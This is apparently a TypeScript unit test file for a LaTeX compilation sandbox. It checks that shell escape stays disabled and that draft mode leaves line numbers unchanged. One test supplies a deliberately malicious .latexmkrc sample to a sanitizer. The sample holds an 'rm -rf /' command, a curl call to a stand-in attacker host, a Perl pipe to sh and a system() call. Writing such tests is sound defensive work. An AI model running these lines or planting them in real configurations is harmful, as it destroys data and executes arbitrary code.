/**
 * test/unit/manuscripts/clsi/compile-tex-flags.spec.ts
 * Verifies that TeX engines strictly enforce -no-shell-escape and reject any attempt to enable it.
 */

import {
  LatexmkEngine,
} from '../../../../src/modules/manuscripts/clsi/services/compile-pipeline.service';
import { BibBackendDetector } from '../../../../src/modules/manuscripts/clsi/domain/bib-backend.detector';
import { DraftModeManager } from '../../../../src/modules/manuscripts/clsi/domain/draft-mode.manager';
import { SandboxPolicyViolationException } from '../../../../src/modules/manuscripts/clsi/domain/sandbox-errors';
import {
  ISandboxRunner,
  ProcessExecutionOptions,
  ProcessExecutionResult,
} from '../../../../src/modules/manuscripts/clsi/domain/clsi-ports';

class MockSandboxRunner implements ISandboxRunner {
  readonly name = 'mock-runner';
  public lastCommand?: string;
  public lastArgs?: string[];
  public lastOptions?: ProcessExecutionOptions;

  public async run(
    command: string,
    args: string[],
    options: ProcessExecutionOptions,
  ): Promise<ProcessExecutionResult> {
    this.lastCommand = command;
    this.lastArgs = args;
    this.lastOptions = options;
    return {
      exitCode: 0,
      stdout: 'Output written on main.pdf (1 page).\nTranscript written on main.log.',
      stderr: '',
    };
  }
}

describe('TeX Compile Flags Enforcement (Slice S1 / US1)', () => {
  let mockRunner: MockSandboxRunner;

  beforeEach(() => {
    mockRunner = new MockSandboxRunner();
  });

  describe('LatexmkEngine', () => {
    it('should always include -no-shell-escape in latexmk arguments', async () => {
      const engine = new LatexmkEngine(mockRunner);
      await engine.compile({
        cwd: '/tmp/workspace',
        mainFile: 'main.tex',
      });

      expect(mockRunner.lastArgs).toBeDefined();
      expect(mockRunner.lastArgs).toContain('-no-shell-escape');
      expect(mockRunner.lastArgs).not.toContain('-shell-escape');
    });

    it('should throw SandboxPolicyViolationException if caller tries to pass shellEscape: true', async () => {
      const engine = new LatexmkEngine(mockRunner);
      await expect(
        engine.compile({
          cwd: '/tmp/workspace',
          mainFile: 'main.tex',
          shellEscape: true,
        }),
      ).rejects.toThrow(SandboxPolicyViolationException);
    });

    it('should never include -shell-escape even in draft or syntaxOnly mode', async () => {
      const engine = new LatexmkEngine(mockRunner);
      await engine.compile({
        cwd: '/tmp/workspace',
        mainFile: 'main.tex',
        draft: true,
        syntaxOnly: true,
      });

      expect(mockRunner.lastArgs).toContain('-no-shell-escape');
      expect(mockRunner.lastArgs).not.toContain('-shell-escape');
    });
  });

  describe('BibBackendDetector.generateLatexmkrc', () => {
    it('should generate .latexmkrc containing -no-shell-escape and never -shell-escape', () => {
      const config = BibBackendDetector.generateLatexmkrc({
        engine: 'pdflatex',
        bibBackend: 'bibtex',
      });

      expect(config).toContain('-no-shell-escape');
      expect(config).not.toMatch(/(?<!-no)-shell-escape/);
    });

    it('should ignore shellEscape: true option and still emit -no-shell-escape', () => {
      const config = BibBackendDetector.generateLatexmkrc({
        engine: 'xelatex',
        bibBackend: 'biber',
        shellEscape: true,
      });

      expect(config).toContain('-no-shell-escape');
      expect(config).not.toMatch(/(?<!-no)-shell-escape/);
    });

    it('should strictly allowlist safe directives in sanitizeUserLatexmkrc and block arbitrary Perl execution', () => {
      const maliciousRc = [
        '$max_repeat = 4;',
        '$bibtex_use = 2;',
        '$pdflatex = "rm -rf / && pdflatex %O %S";',
        '`curl http://evil.example.com`;',
        'open(my $fh, "|-", "sh");',
        '$compiling_cmd = "malicious";',
        'BEGIN { system("id"); }',
      ].join('\n');

      const sanitized = BibBackendDetector.sanitizeUserLatexmkrc(maliciousRc);
      expect(sanitized).toContain('$max_repeat = 4;');
      expect(sanitized).toContain('$bibtex_use = 2;');
      expect(sanitized).not.toContain('rm -rf');
      expect(sanitized).not.toContain('curl');
      expect(sanitized).not.toContain('open(');
      expect(sanitized).not.toContain('$compiling_cmd');
      expect(sanitized).not.toContain('BEGIN');
    });
  });

  describe('DraftModeManager.apply', () => {
    it('should preserve exact line count and line numbers when injecting graphicx draft option', () => {
      const original = [
        '% Preamble comment',
        '\\documentclass[12pt]{article}',
        '\\usepackage{graphicx}',
        '\\begin{document}',
        'Line 5 error here',
        '\\end{document}',
      ].join('\n');

      const { source: injected, isModified } = DraftModeManager.apply(original, { draft: true });
      const origLines = original.split('\n');
      const injectedLines = injected.split('\n');

      expect(isModified).toBe(true);
      expect(injectedLines.length).toBe(origLines.length);
      expect(injectedLines[1]).toContain('\\PassOptionsToPackage{draft}{graphicx}\\documentclass[12pt]{article}');
      expect(injectedLines[4]).toBe('Line 5 error here');
    });
  });
});
